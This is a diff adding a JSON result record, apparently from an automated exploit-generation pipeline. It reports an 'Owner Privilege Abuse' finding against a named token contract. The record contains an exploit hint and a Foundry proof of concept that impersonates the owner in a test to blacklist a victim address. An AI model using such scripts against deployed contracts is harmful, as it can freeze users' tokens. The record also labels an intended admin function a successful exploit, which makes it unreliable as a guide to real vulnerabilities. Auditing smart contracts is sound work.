@@ -1,0 +1,61 @@
+{
+  "project_id": "lsl",
+  "target_address": "0x401e15Af5eDB56BE940D5a16b948F9436D2944F0",
+  "finding_id": 2,
+  "status": "SUCCESS",
+  "violation_target": {
+    "target_address": "0x401e15Af5eDB56BE940D5a16b948F9436D2944F0",
+    "vulnerability_type": "Owner Privilege Abuse",
+    "violation_category": "LOGIC",
+    "finding_id": 2,
+    "preconditions": [
+      {
+        "type": "role",
+        "description": "Attacker must be authorized (owner or authorized address) to call blacklistAddress function",
+        "token_address": null,
+        "min_amount": null
+      },
+      {
+        "type": "state",
+        "description": "Trading must be open (tradingOpen == true)",
+        "token_address": null,
+        "min_amount": null
+      }
+    ],
+    "oracle_verification": {
+      "economic_check": null,
+      "logic_check": {
+        "target_variable": "LionsLounge.isBlacklisted[<victim_address>]",
+        "operator": "==",
+        "expected_value": "true"
+      }
+    },
+    "exploit_hint": "As an authorized address, call the blacklistAddress function with a victim's address and set _value to true. This will prevent the victim from sending or receiving tokens through the contract's transfer functions, effectively blocking their transactions."
+  },
+  "final_poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface LionsLounge {\n    function getOwner() external view returns (address);\n    function blacklistAddress(address _address, bool _value) external;\n    function isBlacklisted(address) external view returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x401e15Af5eDB56BE940D5a16b948F9436D2944F0;\n    address attacker = address(this);\n    address victim = address(0x123);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate the owner directly\n        victim = address(0x123);\n        vm.label(victim, \"Victim Address\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Get the owner address\n        address owner = LionsLounge(TARGET).getOwner();\n        \n        // Impersonate the owner\n        vm.prank(owner);\n        \n        // Call blacklistAddress to blacklist the victim\n        LionsLounge(TARGET).blacklistAddress(victim, true);\n        \n        // Verify the victim is now blacklisted\n        bool isBlacklisted = LionsLounge(TARGET).isBlacklisted(victim);\n        assertEq(isBlacklisted, true, \"Victim should be blacklisted\");\n        assertEq(isBlacklisted, true, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+  "attempts": [
+    {
+      "attempt_number": 1,
+      "vulnerability_analysis": "The LionsLounge contract has a blacklistAddress function that can be called by authorized addresses (owner or addresses added via authorize()). This function allows setting any address as blacklisted, which prevents them from sending or receiving tokens. This is an owner privilege abuse vulnerability where an authorized address can arbitrarily block any user from using the token.",
+      "attack_strategy": "Impersonate the contract owner (who is already authorized) and call blacklistAddress to blacklist a victim address. This will satisfy the oracle check that expects isBlacklisted[victim] == true.",
+      "step_by_step_plan": "1. Get the owner address from the contract\n2. Use vm.prank to impersonate the owner\n3. Call blacklistAddress(victimAddress, true)\n4. Verify isBlacklisted[victimAddress] == true",
+      "failure_reflection": "",
+      "action": "write_poc",
+      "tool_calls": [],
+      "poc_code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\n\ninterface LionsLounge {\n    function getOwner() external view returns (address);\n    function blacklistAddress(address _address, bool _value) external;\n    function isBlacklisted(address) external view returns (bool);\n}\n\ncontract ExploitTest is Test {\n    // ─── State Variables ─────────────────────────────────────\n    address constant TARGET = 0x401e15Af5eDB56BE940D5a16b948F9436D2944F0;\n    address attacker = address(this);\n    address victim = address(0x123);\n\n    // ─── Setup ───────────────────────────────────────────────\n    function setUp() public {\n        // No special setup needed - we'll impersonate the owner directly\n        victim = address(0x123);\n        vm.label(victim, \"Victim Address\");\n    }\n\n    // ─── Exploit ─────────────────────────────────────────────\n    function testExploit() public {\n\n        // Get the owner address\n        address owner = LionsLounge(TARGET).getOwner();\n        \n        // Impersonate the owner\n        vm.prank(owner);\n        \n        // Call blacklistAddress to blacklist the victim\n        LionsLounge(TARGET).blacklistAddress(victim, true);\n        \n        // Verify the victim is now blacklisted\n        bool isBlacklisted = LionsLounge(TARGET).isBlacklisted(victim);\n        assertEq(isBlacklisted, true, \"Victim should be blacklisted\");\n        assertEq(isBlacklisted, true, \"Logic Exploit Failed: State not tampered\");\n    }\n\n\n    // ─── Receive ETH ─────────────────────────────────────────\n    receive() external payable {}\n}",
+      "exit_code": 0,
+      "error": null,
+      "feedback": null,
+      "duration_seconds": 35.96071696281433,
+      "prompt_tokens": 15689,
+      "completion_tokens": 1159,
+      "total_cost": 0.0
+    }
+  ],
+  "total_attempts": 1,
+  "error_message": null,
+  "total_duration_seconds": 35.96543312072754,
+  "total_prompt_tokens": 15689,
+  "total_completion_tokens": 1159,
+  "total_cost": 0.0
+}
